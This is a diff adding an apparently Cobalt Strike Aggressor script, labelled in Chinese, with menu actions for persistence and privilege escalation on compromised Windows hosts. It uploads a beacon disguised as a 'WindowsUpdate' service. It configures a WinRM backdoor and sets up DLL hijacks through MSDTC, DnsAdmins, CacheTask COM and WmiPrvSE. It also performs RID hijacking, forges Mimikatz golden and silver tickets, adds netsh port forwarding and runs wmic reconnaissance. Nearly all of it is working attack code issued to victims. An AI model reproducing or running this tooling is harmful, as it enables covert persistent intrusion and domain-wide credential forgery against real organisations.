@@ -1,0 +1,378 @@
+menu "权限维持"{
+    item "CS 服务马"{
+        $bid = $1;
+        servicebeacon($bid);
+    }
+
+    item "Winrm 后门"{
+        $bid = $1;
+        winrm_config($bid);
+    }
+
+    item "Msdtc DLL 劫持"{
+        $bid = $1;
+        msdtc($bid);
+
+    }
+    
+    item "Dnsadmin 后门"{
+        $bid = $1;
+        dnsadmin_config($bid);
+    }
+
+
+    item "WmiPrvSE 劫持"{
+        show_message("WmiPrvSE提权机会只有一次，失败就没了。一般系统运行只有一个WmiPrvSE.exe进程，当有超过一个WmiPrvSE.exe进程存在时。无法提权");
+        WmiPrvSE_config($bid);
+    }
+    
+    item "CacheTask任务计划COM接口劫持"{
+        CacheTask($bid);
+    }
+    
+    menu "RID劫持"{
+        item "本地windows用户RID查询"{
+            ridquery($bid);
+        }
+        
+        item "RID劫持"{
+            ridrun($bid);
+        }
+    }
+	  item "白银票据" {
+    $bid = $1['@'];
+		$dialog = dialog("白银票据", %(user => "administrator", domain => "xxxx.com", sid => "sid", target => "dc.xxxx.com", rc4 => "NTLM", service => "cifs", bid => $bid), &SilverTicket);
+    dialog_description($dialog, "生成白银票据，攻击者必须获得目标服务账号的密码ntml-hash值。");
+    drow_text($dialog, "domain", "域名: ");
+    drow_text($dialog, "sid", "sid: ");
+    drow_text($dialog, "target", "目标主机名: ");
+    drow_text($dialog, "rc4", "NTLM-hash: ");
+    drow_text($dialog, "service", "伪造的服务: ");
+    drow_text($dialog, "user", "伪造用户名: ");
+    dbutton_action($dialog, "运行");
+    dialog_show($dialog);
+  }
+  sub SilverTicket {
+    $user = $3['user'];
+    $domain = $3['domain'];
+    $sid = $3['sid'];
+    $target = $3['target'];
+    $rc4 = $3['rc4'];
+    $service = $3['service'];
+    bmimikatz($bid, "kerberos::golden /domain:$domain /sid:$sid /target:$target /rc4:$rc4 /service:$service /user:$user /ptt exit");
+  }
+
+  item "黄金票据" {
+    $bid = $1['@'];
+		$dialog = dialog("黄金票据", %(admin => "administrator", domain => "xxxx.com", sid => "sid", krbtgt => "NTLM", bid => $bid), &GoldenTicket);
+    dialog_description($dialog, "生成黄金票据，攻击者必须获得krbtgt账户的ntml-hash值。");
+    drow_text($dialog, "admin", "伪造用户名: ");
+    drow_text($dialog, "domain", "域名: ");
+    drow_text($dialog, "sid", "sid: ");
+    drow_text($dialog, "krbtgt", "krbtgt NTLM-hash: ");
+    dbutton_action($dialog, "运行");
+    dialog_show($dialog);
+  }
+  sub GoldenTicket {
+    $admin = $3['admin'];
+    $domain = $3['domain'];
+    $sid = $3['sid'];
+    $krbtgt = $3['krbtgt'];
+    bmimikatz($bid, "kerberos::golden /admin:$admin /domain:$domain /sid:$sid /krbtgt:$krbtgt /ptt exit");
+  }
+
+}
+
+
+
+sub servicerun{
+	$exename = $3["exename"];
+	$data = artifact_payload("$3['listener']", "svcexe", "$3['arch']");
+	$handle = openf(">$exename");
+	writeb($handle, $data);
+	closef($handle);
+	btask($3["bid"], "生成服务马，Listener:$3['listener'] 位数:$3['arch'] 保存名称:$exename");
+	bupload($3["bid"], script_resource($exename));
+	bmv($3['bid'], $exename, $3["uploadoutpath"].$exename);
+	btask($3["bid"], "上传到$3['uploadoutpath']");
+	$command = "sc create WindowsUpdate binPath= ".$3['uploadoutpath'].$exename." start= auto obj= LocalSystem DisplayName= windowsupdate";
+	btask($3["bid"], "run $command");
+	bshell($3["bid"],  $command);
+	btask($3["bid"], "Query WindowsUpdate Service");
+	bshell($3["bid"], "sc qc WindowsUpdate");
+	btask($3["bid"], "Run WindowsUpdate Service");
+	bshell($3["bid"], "sc start WindowsUpdate");
+}
+
+sub winrm_set{
+	if ($3['bid']) {
+		btask($bid ,"setting winrm");
+		bshell($bid, "winrm quickconfig -q");
+		bshell($bid, 'winrm set winrm/config/service @{EnableCompatibilityHttpListener="true"}');
+		bshell($bid, "winrm set winrm/config/Listener?Address=*+Transport=HTTP @{Port=\"$3['port']\"}");
+		bshell($bid, "winrm set winrm/config/Client @{TrustedHosts=\"*\"}");
+		btask($bid, "winrm config");
+		bshell($bid, "winrm e winrm/config/listener");
+	#	btask($bid,"客户端连接使用：winrm quickconfig -q\nwinrm set winrm/config/Client @{TrustedHosts="*"}\nwinrs -r:<ip>:<port> -u:<user> -p:<password> <command>\nExample:winrs -r:http://127.0.0.1:80 -u:administrator -p:123456 whoami");
+	}else{
+		berror($3['bid'], "Not an administrator");
+	}
+}
+
+sub winrm_config{
+	$dialog = dialog("Winrm config", %(port => "80", bid => $bid), &winrm_set);
+	dialog_description($dialog, "winrm后门端口设置\nwindows server 2008或以下端口默认为80端口(端口复用)，无法进行修改");
+	drow_text($dialog, "port", "port:");
+	dbutton_action($dialog, "run");
+	dialog_show($dialog);
+}
+
+
+sub usbhistory{
+	bpowerpick($bid, "Get-ItemProperty -Path HKLM:\\SYStem\\CurrentControlSet\\Enum\\USBSTOR\\*\\* | Select FriendlyName");
+}
+
+sub checkdomain{
+	bpowerpick($bid, "\$domain=(((Get-WmiObject Win32_ComputerSystem).partofdomain) -eq \$False ) -or ( -not  \$Env:USERDNSDOMAIN);write-Host \"是否有域(True/False):\"\$domain");
+}
+
+sub deviceget{
+	bshell($bid, "wmic logicaldisk get deviceid,FileSystem");
+}
+
+sub getinstall{
+	bshell($bid, "wmic product get name");
+}
+
+
+sub getosinfo{
+	bshell($bid, "wmic os get name,Version,OSArchitecture");
+}
+
+
+sub nicconfiginfo{
+	bshell($bid, "wmic NICCONFIG get Description,IPAddress,IPSubnet,MACAddress,DHCPServer");
+}
+
+
+sub computergetinfo{
+	bshell($bid, "wmic COMPUTERSYSTEM get UserName,Workgroup,SystemFamily");
+	bshell($bid, "wmic cpu get Name,AddressWidth");
+	bshell($bid, "wmic MEMORYCHIP get PartNumber,Capacity,Speed");
+}
+
+sub usergetinfo{
+	bshell($bid, "wmic USERACCOUNT get Name,Domain,SID,Disabled,PasswordChangeable,PasswordRequired");
+}
+
+sub groupgetinfo{
+	bshell($bid, "wmic group get Description,Name,SID");
+}
+
+sub msdtc_config{
+	$dll = $3['file'];
+	$name = split("\\\\", $dll);
+	$dllname = $name[-1];
+	$dllname_w = $3['file2']."\\\\oci.dll";
+	foreach $id ($bid){
+		if(-isadmin $id){
+			btask($id, "配置msdtc dll劫持");
+			bshell($id, "sc stop msdtc");
+			bshell($id, "del C:\\Windows\\System32\\oci.dll /F");
+			bupload($id, $dll);
+			bmv($id, $dllname, $dllname_w);
+			bshell($id, "sc config msdtc obj= LocalSystem");
+			bshell($id, "sc start msdtc");
+		}else{
+			btask($id, "不是Administrator权限");
+		}
+	}
+}
+
+sub msdtc{
+	$dialog = dialog("msdtc DLL hijack config", %(file => "",file2 => "C:\\Windows\\System32"), &msdtc_config);
+	dialog_description($dialog, "msdtc DLL劫持");
+	drow_file($dialog, "file", "DLL Path:");
+	drow_text($dialog, "file2", "RHOST Path:");
+	dbutton_action($dialog, "RUN");
+	dialog_show($dialog);
+}
+
+sub dnsadminrun{
+	println($3);
+	$dll = split("\\\\", $3['dllpath'])[-1];
+	$dllname = $3['uploadpath']."raj.dll";
+	println($3['uploadpath']."raj.dll");
+	bupload!($3['bid'], $3['dllpath']);
+	bmv!($3['bid'], $dll, $dllname);
+	bshell!($3['bid'], "dnscmd /config /serverlevelplugindll ".$dllname);
+	bshell!($3['bid'], "sc stop dns");
+	bshell!($3['bid'], "sc start dns");
+}
+
+sub dnsadmin_config{
+	foreach $id ($bid){
+		$dialog = dialog("DnsAdminConfig", %(uploadpath => "C:\\Windows\\System32\\", bid => $id), &dnsadminrun);
+		dialog_description($dialog, "DnsAdmins权限维持");
+		drow_text($dialog, "uploadpath", "uploadpath:");
+		drow_file($dialog, "dllpath", "dllpath:" );
+		dbutton_action($dialog, "run");
+		dialog_show($dialog);
+	}
+}
+
+sub CacheTaskExec{
+	btask($3['bid'], "CacheTask任务计划COM接口DLL劫持");
+	$dllname = split("\\\\", $3['dllpath'])[-1];
+	bupload!($3['bid'], $3['dllpath']);
+	bmv!($3['bid'], $dllname, $3['uploadpath']);
+	bshell!($3['bid'], "reg add \"HKCU\\Software\\Classes\\CLSID\\{0358B920-0AC7-461F-98F4-58E32CD89148}\\InProcServer32\" /ve /t REG_SZ /d $3['uploadpath']");
+	bshell!($3['bid'], "reg add \"HKCU\\Software\\Classes\\CLSID\\{0358B920-0AC7-461F-98F4-58E32CD89148}\\InProcServer32\" /v ThreadingModel /t REG_SZ /d Both")
+}
+
+sub CacheTask{
+	foreach $id ($bid){
+		$dialog = dialog("CacheTask", %(uploadpath => "C:\\Windows\\Temp\\test.dll", bid => $id), &CacheTaskExec);
+		dialog_description($dialog, "CacheTask任务计划COM接口DLL劫持,适用系统:Windows 10/Windows Server 2012或以上");
+		drow_text($dialog, "uploadpath", "uploadpath:");
+		drow_file($dialog, "dllpath", "dllpath:");
+		dbutton_action($dialog, "run");
+		dialog_show($dialog);
+	}
+}
+
+
+sub servicebeacon{
+	foreach $id ($bid){
+		$dialog = dialog("ServiceRunBeacon", %(uploadoutpath => "C:\\Windows\\Temp\\", arch => barch($id) ,exename => "svchost.exe", servicename => "WindowsUpdate", bid => $id), &servicerun);
+		dialog_description($dialog, "生成服务马上传执行，进行权限维持");
+		drow_text($dialog, "arch", "arch:");
+		drow_text($dialog, "uploadoutpath", "uploadoutpath:");
+		drow_text($dialog, "servicename",  "servicename:");
+		drow_text($dialog, "exename", "outputexename:");
+		drow_listener($dialog, "listener", "Listener: ");
+		dbutton_action($dialog, "run");
+		dialog_show($dialog);
+	}
+
+}
+
+sub ridquery{
+	$command = "\$data=Get-WmiObject -Class Win32_UserAccount | Select-Object Name,SID
+foreach(\$n in \$data){
+	\$username=\$n.Name
+	\$sid=\$n.SID  -split \"-\"
+	\$sid=[Convert]::ToString(\$sid[-1],16)
+	\$number=\$sid.Length%2
+	if(\$number -eq 1){
+		\$rid=\"0\"+\$sid
+		\$rid=[System.String]::Join(\"\",\$rid[-2..-1]+\$rid[0..1])
+	}
+	write-host \"Name:\"\$username \"Sid:\"\$sid \"Rid:\"\$rid
+}";
+	foreach $id ($bid){
+		bpowerpick($id, $command);
+	}
+}
+
+sub ridhijack{
+	$handle = openf(script_resource("ridhijack.ps1"));
+	$data = readb($handle, -1);
+	closef($handle);
+	$data = replace($data, "XXXXXXXXXXXX", $3['rid']);
+	bpowerpick($3['bid'], $data);
+}
+
+
+sub ridrun{
+	foreach $id ($bid){
+		$dialog = dialog("Rid Hijack", %(rid => "f401", bid => $id), &ridhijack);
+		dialog_description($dialog, "RID劫持，将Guest的RID改为别的用户的RID");
+		drow_text($dialog, "rid", "RID:");
+		dbutton_action($dialog, "Run");
+		dialog_show($dialog);
+	}
+}
+
+
+sub netsh_exec{
+	if ($set eq "port"){
+		$lhost = $3['lhost'];
+		$rhost = $3['rhost'];
+		$lport = $3['lport'];
+		$rport = $3['rport'];
+		foreach $id ($bid){
+			btask($id, "端口转发:$lhost : $lport -> $rhost : $rport");
+			bshell($id, "netsh interface portproxy add v4tov4 listenport=$lport listenaddress=$lhost connectport=$rport connectaddress=$rhost");
+			btask($id, "查看端口转发列表");
+			bshell($id, "netsh interface portproxy show all");
+
+		}
+	}else{
+		$lhost = $3['lhost'];
+		$lport = $3['lport'];
+		foreach $id ($bid){
+			btask($id, "删除端口转发：$lhost : $lport");
+			bshell($id, "netsh interface portproxy delete v4tov4 listenport=$lport listenaddress=$lhost");
+			btask($id, "查看端口转发列表");
+			bshell($id, "netsh interface portproxy show all");
+		}
+	}
+}
+
+sub netsh_poort{
+	$dialog = dialog("netsh Port",%(lhost => "127.0.0.1",  rhost => "192.168.1.2", lport => "4444", rport => "4444"), &netsh_exec);
+	dialog_description($dialog, "netsh端口转发配置\nnetsh端口转发删除");
+	if ($set eq "port"){
+		drow_text($dialog, "lhost", "LHOST:");
+		drow_text($dialog, "rhost", "RHOST:");
+		drow_text($dialog, "lport", "LPORT:");
+		drow_text($dialog, "rport", "RPORT:");
+	}else{
+		drow_text($dialog, "lport", "LPORT:");
+		drow_text($dialog, "lhost", "LHOST:");
+	}
+	dbutton_action($dialog, "run");
+	dialog_show($dialog);
+
+}
+
+sub WmiPrvSE{
+	$dllname = $3['dll'];
+	$dllend = split("\\\\", $3['dll'])[-1];
+#	println($dllend);
+	$uploadpath = $3['uploadpath']."\\".$dllend;
+#	println($uploadpath);
+	$ps = 	bps($bid, lambda({
+		println($data);
+	}, $callback => $data));
+	foreach $id ($bid){
+		btask($id, "WmiPrvSE DLL劫持开始配置");
+		if(-isadmin $id){
+			btask($id, "当前为管理员权限，杀掉WmiPrvSE.exe进程");
+			bshell($id, "taskkill /F /IM WmiPrvSE.exe");
+		#	btask($id, "重新启动WmiPrvSE.exe进程");
+		#	bshell($id, "WmiPrvSE.exe");
+		}
+		bupload($id, $dllname);
+		bmv($id, $dllend, $uploadpath);
+		bshell($id, "reg delete HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\Dnscache\\Performance /F");
+		bshell($id, "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\Dnscache\\Performance /F");
+		bshell($id, "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\Dnscache\\Performance /v Close /t REG_SZ /d ClosePerfData /F");
+		bshell($id, "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\Dnscache\\Performance /v Collect /t REG_SZ /d CollectPerfData /F");
+		bshell($id, "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\Dnscache\\Performance /v Library /t REG_SZ /d ".$uploadpath." /F");
+		bshell($id, "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\Dnscache\\Performance /v Open /t REG_SZ /d OpenData /F");
+		bshell($id, "powershell -c \"Get-WmiObject -List | Where-Object {\$_.Name -Like \"\"Win32_Perf*\"\"\"\"}\"");
+	}
+	
+
+}
+
+sub WmiPrvSE_config{
+	$dialog = dialog("WmiPrvSE_config",%(uploadpath => "C:\\Windows\\Temp"), &WmiPrvSE);
+	dialog_description($dialog, "WmiPrvSE劫持\n提权适用于:Windows Server 2008\nWindows 7\n或更低版本\n或者用于做权限维持");
+	drow_file($dialog, "dll", "dll:");
+	drow_text($dialog, "uploadpath", "upload_path:");
+	dbutton_action($dialog, "run");
+	dialog_show($dialog);
+}
